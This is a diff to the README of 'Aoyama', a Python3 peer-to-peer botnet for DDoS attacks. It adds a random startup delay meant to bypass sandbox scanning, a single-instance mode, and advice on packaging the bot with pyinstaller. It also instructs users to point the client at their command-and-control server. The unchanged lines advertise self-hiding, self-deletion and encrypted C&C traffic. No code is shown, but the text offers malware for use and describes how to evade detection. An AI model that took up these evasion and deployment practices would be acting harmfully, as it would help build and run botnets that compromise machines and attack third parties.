@@ -1,4 +1,4 @@
-# Aoyama ![](https://img.shields.io/badge/Version-1.0-brightgreen.svg)  ![](https://img.shields.io/badge/license-GPL2.0-green.svg)
+# Aoyama ![](https://img.shields.io/badge/Version-1.1-brightgreen.svg)  ![](https://img.shields.io/badge/license-GPL2.0-green.svg)
 Aoyama is a New version of Python3 P2P botnet, old version: http://github.com/Leeon123/Python3-botnet
 
 Aoyama is for ddos(Maybe add more function later, such as...keylogger?)
@@ -16,6 +16,8 @@ Aoyama is for ddos(Maybe add more function later, such as...keylogger?)
 - [x] Encrypted traffic(xor)
 - [x] Deamon(only linux)(PS: You can use pyinstaller option '--noconsole' on windows)
 - [x] Hide itself(linux: Deamon + delete itself | windows: Hide sys.argv[0])
+- [x] Added single instance mode
+- [x] Startup delay 30~90(random) seconds to bypass some sandbox scanning
 
 **CNC:**
 - [x] Encrypted traffic(xor)
@@ -25,8 +27,11 @@ Aoyama is for ddos(Maybe add more function later, such as...keylogger?)
 - [x] Using putty raw-mode login(on windows) and telnet(on linux)
 - [x] Using 'ping/pong' to check bot connection status(use 'scan' to check it by yourself or it checks every min.)
 
+## Opinion:
+In my optinion, best way is using **python v3.4.3** and **pyinstaller v3.2**. They are the best pattern i tested and used.
+
 ## Usage:
-***Edit*** the cnc server ip and port into the client.py **at first**.
+***Change*** the cnc server ip and port into the client.py **at first**.
 
 Then, edit the password of cnc.py and run the cnc.py:
 
